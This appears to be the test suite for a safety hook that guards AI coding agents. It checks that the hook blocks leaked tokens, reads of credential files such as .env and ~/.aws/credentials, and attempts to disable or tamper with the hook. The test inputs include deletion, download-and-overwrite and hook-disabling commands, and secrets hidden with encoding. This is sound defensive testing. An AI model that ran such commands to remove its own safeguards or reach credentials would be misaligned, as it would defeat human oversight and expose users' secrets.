// guard in other agents: each adapter reads the agent's native hook input and answers in the
// agent's own format. Runs the real hook process, as the agents do.
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { test } from 'node:test';
import { fileURLToPath } from 'node:url';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');

const HOOK = path.join(ROOT, 'src', 'guard', 'hook.mjs');

// Synthetic, built at run time so the repository holds no credential-shaped literal.
const token = (seed, n) => {
  const a = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let x = seed;
  let s = '';

  for (let i = 0; i < n; i++) {
    x = (x * 1103515245 + 12345) % 2147483648;
    s += a[x % 62];
  }

  return s;
};

const GITHUB = `ghp_${token(7, 36)}`;

const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'bb-harness-'));

function run(harness, event, input, mode = 'protect') {
  const home = tmp();
  fs.writeFileSync(path.join(home, 'state.json'), JSON.stringify({ mode }));
  const r = spawnSync(process.execPath, [HOOK, event, '--harness', harness], { input: JSON.stringify(input), encoding: 'utf8', env: { ...process.env, BLACKBRAKE_HOME: home, BLACKBRAKE_LANG: 'en', BLACKBRAKE_NO_WINDOW: '1' } });
  let json = null;

  try { json = r.stdout ? JSON.parse(r.stdout) : null; } catch { /* plain text */ }

  return { code: r.status, stdout: r.stdout, stderr: r.stderr, json };
}

test('a secret in the user message is stopped in every agent that allows it', () => {
  const prompt = `deploy with ${GITHUB}`;
  const codex = run('codex', 'UserPromptSubmit', { session_id: 's', prompt });
  assert.equal(codex.json.decision, 'block');
  const gemini = run('gemini', 'BeforeAgent', { session_id: 's', prompt });
  assert.equal(gemini.json.decision, 'deny');
  const cursor = run('cursor', 'beforeSubmitPrompt', { conversation_id: 's', prompt });
  assert.equal(cursor.json.continue, false);
  const windsurf = run('windsurf', 'pre_user_prompt', { trajectory_id: 's', tool_info: { user_prompt: prompt } });
  assert.equal(windsurf.code, 2);

  for (const r of [codex, gemini, cursor, windsurf]) assert.ok(!`${r.stdout}${r.stderr}`.includes(GITHUB), 'never echoes the secret');
});

test('risky reads: ask where the agent can ask, deny (and say why) where it cannot', () => {
  const gem = run('gemini', 'BeforeTool', { tool_name: 'read_file', tool_input: { file_path: '/p/.env' } });
  assert.equal(gem.json.decision, 'deny');
  assert.match(gem.json.reason, /cannot ask for confirmation/);
  const cur = run('cursor', 'beforeShellExecution', { conversation_id: 's', command: 'printenv' });
  assert.equal(cur.json.permission, 'ask');
  const codex = run('codex', 'PreToolUse', { tool_name: 'Bash', tool_input: { command: 'cat ~/.aws/credentials' } });
  assert.equal(codex.json.hookSpecificOutput.permissionDecision, 'deny', 'Codex does not support ask');
  const cop = run('copilot', 'PreToolUse', { hook_event_name: 'PreToolUse', tool_name: 'Read', tool_input: { file_path: '/p/.env' } });
  assert.equal(cop.json.permissionDecision, 'ask');
  const ws = run('windsurf', 'pre_read_code', { tool_info: { file_path: '/p/id_rsa' } });
  assert.equal(ws.code, 2);
});

test('observe mode never blocks: it warns in the agent\'s own channel', () => {
  const gem = run('gemini', 'BeforeTool', { tool_name: 'read_file', tool_input: { file_path: '/p/.env' } }, 'observe');
  assert.equal(gem.json.decision, undefined);
  assert.match(gem.json.systemMessage, /\.env/);
  const ws = run('windsurf', 'pre_read_code', { tool_info: { file_path: '/p/.env' } }, 'observe');
  assert.equal(ws.code, 0);
  assert.match(ws.stdout, /\.env/);
  const cur = run('cursor', 'beforeShellExecution', { command: 'printenv' }, 'observe');
  assert.equal(cur.json.permission, 'allow');
});

test('Cursor permission hooks always answer with valid JSON (silence would block the action)', () => {
  for (const [event, input] of [['beforeShellExecution', { command: 'ls' }], ['beforeReadFile', { file_path: '/p/a.js', content: 'x' }], ['beforeMCPExecution', { tool_name: 'q', tool_input: '{}', mcp_server_name: 'db' }], ['preToolUse', { tool_name: 'Shell', tool_input: { command: 'ls' } }]]) {
    assert.deepEqual(run('cursor', event, input).json, { permission: 'allow' }, event);
  }
});

test('Cursor hands over file contents before a read: protect refuses a file with real keys', () => {
  const r = run('cursor', 'beforeReadFile', { conversation_id: 's', file_path: '/p/config.js', content: `const t = "${GITHUB}";` });
  assert.equal(r.json.permission, 'deny');
  assert.ok(!r.stdout.includes(GITHUB));
});

test('tool output with a secret is hidden from the model in the agent\'s own format', () => {
  const out = `token=${GITHUB}\n`;
  const codex = run('codex', 'PostToolUse', { tool_name: 'Bash', tool_input: { command: 'env' }, tool_response: out });
  assert.equal(codex.json.decision, 'block');
  const gem = run('gemini', 'AfterTool', { tool_name: 'run_shell_command', tool_input: { command: 'env' }, tool_response: { llmContent: out } });
  assert.equal(gem.json.decision, 'deny');
  const cop = run('copilot', 'postToolUse', { toolName: 'bash', toolArgs: '{"command":"env"}', toolResult: { resultType: 'success', textResultForLlm: out } });
  assert.equal(cop.json.modifiedResult.resultType, 'success');

  for (const r of [codex, gem, cop]) {
    assert.ok(!r.stdout.includes(GITHUB), 'masked');
    assert.match(r.stdout, /token=/, 'the rest of the output survives');
  }
});

test('tamper protection works through every adapter', () => {
  const patch = `*** Begin Patch\n*** Update File: ${path.join(os.homedir(), '.blackbrake', 'state.json')}\n+{}\n*** End Patch`;
  assert.equal(run('codex', 'PreToolUse', { tool_name: 'apply_patch', tool_input: { command: patch } }, 'observe').json.hookSpecificOutput.permissionDecision, 'deny');
  assert.equal(run('gemini', 'BeforeTool', { tool_name: 'write_file', tool_input: { file_path: path.join(os.homedir(), '.gemini', 'settings.json'), content: '{}' } }, 'observe').json.decision, 'deny');
  assert.equal(run('windsurf', 'pre_run_command', { tool_info: { command_line: 'rm -rf ~/.blackbrake' } }, 'observe').code, 2);
  assert.equal(run('cursor', 'preToolUse', { tool_name: 'Write', tool_input: { file_path: path.join(os.homedir(), '.cursor', 'hooks.json'), content: '{}' } }, 'observe').json.permission, 'deny');
});

// Found by the security review of the adapters.
test('review: relative and renamed paths, removed hook entries, unknown tools, future events', () => {
  const cwd = path.join(os.homedir(), 'proj');
  const rel = `*** Begin Patch\n*** Update File: .codex/config.toml\n+[features]\n+hooks = false\n*** End Patch`;
  assert.equal(run('codex', 'PreToolUse', { cwd, tool_name: 'apply_patch', tool_input: { command: rel } }, 'observe').json.hookSpecificOutput.permissionDecision, 'deny', 'relative patch path');
  const move = `*** Begin Patch\n*** Update File: notes.txt\n*** Move to: ${path.join(os.homedir(), '.blackbrake', 'state.json')}\n*** End Patch`;
  assert.equal(run('codex', 'PreToolUse', { cwd, tool_name: 'apply_patch', tool_input: { command: move } }, 'observe').json.hookSpecificOutput.permissionDecision, 'deny', 'Move to');
  const drop = { tool_name: 'replace', tool_input: { file_path: '/repo/.gemini/settings.json', old_string: '{"type":"command","command":"node \\"/h/.blackbrake/app/src/guard/hook.mjs\\" BeforeTool"}', new_string: '' } };
  assert.equal(run('gemini', 'BeforeTool', drop, 'observe').json.decision, 'deny', 'removing guard\'s entry from a project hook file');
  const off = { tool_name: 'replace', tool_input: { file_path: '/repo/.gemini/settings.json', old_string: '"x": 1', new_string: '"hooks": { "enabled": false }' } };
  assert.equal(run('gemini', 'BeforeTool', off, 'observe').json.decision, 'deny', 'hooks.enabled false');
  assert.equal(run('cursor', 'preToolUse', { tool_name: 'Delete', tool_input: { path: path.join(os.homedir(), '.blackbrake', 'state.json') } }, 'observe').json.permission, 'deny', 'delete tool');
  assert.equal(run('codex', 'PreToolUse', { tool_name: 'some_new_tool', tool_input: { target: '~/.blackbrake/state.json' } }, 'observe').json.hookSpecificOutput.permissionDecision, 'deny', 'unknown tool names are checked too');
  assert.equal(run('cursor', 'beforeSomethingNew', { x: 1 }).json.permission, 'deny', 'an unchecked future permission hook fails closed in protect');
  const warn = run('cursor', 'beforeShellExecution', { command: 'printenv' }, 'observe').json;
  assert.equal(warn.permission, 'allow');
  assert.match(warn.user_message, /environment/, 'observe warnings reach Cursor users');
});

test('review round 2: Copilot patches, Windows and archive writes, overwriting a hook file, brace globs', async () => {
  const patch = `*** Begin Patch\n*** Delete File: ${path.join(os.homedir(), '.blackbrake', 'state.json')}\n*** End Patch`;
  assert.equal(run('copilot', 'PreToolUse', { hook_event_name: 'PreToolUse', tool_name: 'apply_patch', tool_input: { command: patch } }, 'observe').json.permissionDecision, 'deny');

  for (const command of ['rmdir /s /q %USERPROFILE%\\.blackbrake', 'tar -xf x.tar -C ~/.blackbrake', 'Expand-Archive x.zip $HOME/.blackbrake']) {
    assert.equal(run('windsurf', 'pre_run_command', { tool_info: { command_line: command } }, 'observe').code, 2, command);
  }

  const { tamper } = await import('../src/guard/policy.mjs');
  assert.equal(tamper('Bash', { command: 'cp ~/{.bashrc,.zshrc} backup/' }, {}), null, 'dotfiles in braces are not guard');
  const dir = tmp();
  const file = path.join(dir, '.cursor', 'hooks.json');
  fs.mkdirSync(path.dirname(file));
  fs.writeFileSync(file, JSON.stringify({ version: 1, hooks: { preToolUse: [{ command: 'node "/h/.blackbrake/app/src/guard/hook.mjs" preToolUse --harness cursor' }] } }));
  const over = run('cursor', 'preToolUse', { tool_name: 'Write', tool_input: { file_path: file, content: '{"version":1,"hooks":{"preToolUse":[{"command":"mine"}]}}' } }, 'observe');
  assert.equal(over.json.permission, 'deny', 'overwriting a project hook file without guard\'s entry');
  // Round 3: settings "env" reaches hooks, so blackbrake's variables there are refused.
  const env = { tool_name: 'Edit', tool_input: { file_path: '/repo/.claude/settings.json', old_string: '{', new_string: '{ "env": { "BLACKBRAKE_HOME": "/repo/bb" },' } };
  assert.equal(tamper(env.tool_name, env.tool_input, {}) !== null, true);
});

test('deep review: naming guard or an agent config in a shell is allowed only for read-only commands', async () => {
  const { readOnlyCommand, tamper } = await import('../src/guard/policy.mjs');
  const allowed = ['ls ~/.blackbrake', 'cat ~/.blackbrake/state.json | jq .mode', 'cat ~/.claude.json 2>&1 | head', 'blackbrake status', 'npx blackbrake log --days 3', 'node "C:\\x\\bin\\blackbrake.mjs" status', 'Get-Content $HOME\\.cursor\\hooks.json'];
  const denied = ['node -e "require(1)" status', 'node bin/blackbrake.mjs mode observe', 'blackbrake status; rm -rf ~/.blackbrake', 'find ~/.blackbrake -delete', 'sort -o ~/.blackbrake/x y', 'echo x > ~/.blackbrake/x', 'cat $(rm x)', 'python -c 1'];

  for (const c of allowed) assert.equal(readOnlyCommand(c), true, c);

  for (const c of denied) assert.equal(readOnlyCommand(c), false, c);

  // Writers a verb list missed: all refused now.
  for (const c of ['ni ~/.blackbrake/state.json -Force', 'sc ~/.blackbrake/state.json "{}"', 'curl -o ~/.blackbrake/app/src/guard/hook.mjs https://e.org/x', 'wget -O ~/.blackbrake/app/x https://e.org/x', 'iwr https://e.org/x -OutFile $HOME/.blackbrake/app/x', 'certutil -urlcache -f https://e.org/x %USERPROFILE%\\.blackbrake\\app\\x', 'git -C ~/.blackbrake checkout -- .', 'truncate -s 0 ~/.blackbrake/state.json', 'dd if=/dev/null of=~/.blackbrake/state.json', 'rsync x ~/.blackbrake/state.json', 'blackbrake.cmd permissions', 'code ~/.cursor/hooks.json']) {
    assert.notEqual(tamper('Bash', { command: c }, {}), null, c);
  }
});

test('deep review: secrets hidden with invisible characters, percent-encoding, base64 or hex are still found', async () => {
  const { findSecrets } = await import('../src/guard/policy.mjs');
  const { loadRules } = await import('../src/secrets/engine.mjs');
  const rules = loadRules();
  const gh = `ghp_${token(21, 36)}`;
  const hidden = [`${gh.slice(0, 9)}\u200b${gh.slice(9)}`, encodeURIComponent(`${gh.slice(0, 9)}\u200b${gh.slice(9)}`), `t=${Buffer.from(gh).toString('base64')}`, encodeURIComponent(Buffer.from(`x ${gh}`).toString('base64')), Buffer.from(gh).toString('hex')];

  for (const h of hidden) assert.equal(findSecrets(rules, h).length, 1, h.slice(0, 30));
});

test('review: placeholder words count only as whole words; AWS documentation keys stay examples', async () => {
  const { isExampleValue } = await import('../src/secrets/context.mjs');
  assert.equal(isExampleValue(`ghp_${token(3, 10)}sample${token(4, 20)}`), false, 'a real token that happens to contain "sample"');
  assert.equal(isExampleValue(`sk-${token(5, 12)}xxxxxx${token(6, 20)}`), false);
  assert.equal(isExampleValue(`gh${'p_'}${'x'.repeat(36)}`), true);
  assert.equal(isExampleValue('sk-your-api-key'), true);
  assert.equal(isExampleValue(`AKIAI44QH8DHB${'EXAMPLE'}`), true);
});

// ---------- installer ----------

function withHome(fn) {
  const home = tmp();
  const env = { ...process.env, HOME: home, USERPROFILE: home, BLACKBRAKE_HOME: path.join(home, '.blackbrake'), BLACKBRAKE_LANG: 'en', CODEX_HOME: '', COPILOT_HOME: '' };
  const script = `import(${JSON.stringify(new URL('../src/guard/agents.mjs', import.meta.url).href)}).then(async (m) => { const r = await (${fn.toString()})(m); process.stdout.write(JSON.stringify(r ?? null)); }).catch((e) => { process.stdout.write(JSON.stringify({ error: e.message })); });`;

  return { home, run: () => JSON.parse(spawnSync(process.execPath, ['--input-type=module', '-e', script], { env, encoding: 'utf8' }).stdout || 'null') };
}

test('installer adds only guard\'s entries, keeps the rest, and removes them cleanly', () => {
  const { home, run: go } = withHome((m) => {
    m.setupAgents(['codex', 'gemini', 'cursor', 'copilot', 'windsurf']);

    return Object.fromEntries(Object.values(m.AGENTS).map((a) => [a.id, a.installed()]));
  });

  fs.mkdirSync(path.join(home, '.gemini'), { recursive: true });
  const mine = { model: { name: 'x' }, hooks: { BeforeTool: [{ matcher: 'run_shell_command', hooks: [{ type: 'command', command: 'my-own-check' }] }] } };
  fs.writeFileSync(path.join(home, '.gemini', 'settings.json'), JSON.stringify(mine));
  const installed = go();
  assert.deepEqual(installed, { codex: true, gemini: true, cursor: true, copilot: true, windsurf: true, devin: false });
  const gem = JSON.parse(fs.readFileSync(path.join(home, '.gemini', 'settings.json'), 'utf8'));
  assert.equal(gem.model.name, 'x', 'other settings kept');
  assert.equal(gem.hooks.BeforeTool[0].hooks[0].command, 'my-own-check', 'the user\'s own hook kept');
  assert.equal(gem.hooks.BeforeTool.length, 2);
  assert.ok(fs.readdirSync(path.join(home, '.blackbrake', 'backups')).some((f) => f.startsWith('gemini-')), 'backup before changing');
  const cop = JSON.parse(fs.readFileSync(path.join(home, '.copilot', 'hooks', 'blackbrake.json'), 'utf8'));
  assert.equal(cop.hooks.PreToolUse[0].exec, 'node', 'Copilot runs guard without a shell');

  // Twice: still one entry per event.
  go();
  assert.equal(JSON.parse(fs.readFileSync(path.join(home, '.gemini', 'settings.json'), 'utf8')).hooks.BeforeTool.length, 2);

  const { run: remove } = withHome((m) => {
    m.uninstallAgents(Object.keys(m.AGENTS));

    return Object.values(m.AGENTS).some((a) => a.installed());
  });

  // Same home: point the second helper at it.
  const env = { ...process.env, HOME: home, USERPROFILE: home, BLACKBRAKE_HOME: path.join(home, '.blackbrake'), BLACKBRAKE_LANG: 'en', CODEX_HOME: '', COPILOT_HOME: '' };
  const url = new URL('../src/guard/agents.mjs', import.meta.url).href;
  spawnSync(process.execPath, ['--input-type=module', '-e', `import(${JSON.stringify(url)}).then((m) => m.uninstallAgents(Object.keys(m.AGENTS)))`], { env });
  void remove;
  const after = JSON.parse(fs.readFileSync(path.join(home, '.gemini', 'settings.json'), 'utf8'));
  assert.deepEqual(after.hooks, mine.hooks, 'back to exactly the user\'s hooks');
  assert.ok(!fs.existsSync(path.join(home, '.copilot', 'hooks', 'blackbrake.json')));
  assert.ok(!fs.existsSync(path.join(home, '.blackbrake', 'app')), 'shared copy removed when unused');
});

test('installer refuses a config it cannot parse, and never writes through a link', () => {
  const { home, run: go } = withHome((m) => ({ error: m.setupAgents(['cursor']).failed[0]?.error }));
  fs.mkdirSync(path.join(home, '.cursor'), { recursive: true });
  fs.writeFileSync(path.join(home, '.cursor', 'hooks.json'), '{ "version": 1, "hooks": { oops');
  assert.match(go().error, /not valid JSON/);
  assert.equal(fs.readFileSync(path.join(home, '.cursor', 'hooks.json'), 'utf8'), '{ "version": 1, "hooks": { oops', 'untouched');

  const target = path.join(home, 'elsewhere.json');
  fs.writeFileSync(target, '{}');
  fs.rmSync(path.join(home, '.cursor', 'hooks.json'));

  try { fs.symlinkSync(target, path.join(home, '.cursor', 'hooks.json'), 'file'); } catch { return; /* no symlink rights on this machine */ }

  assert.match(go().error, /symbolic link/);
  assert.equal(fs.readFileSync(target, 'utf8'), '{}');
});
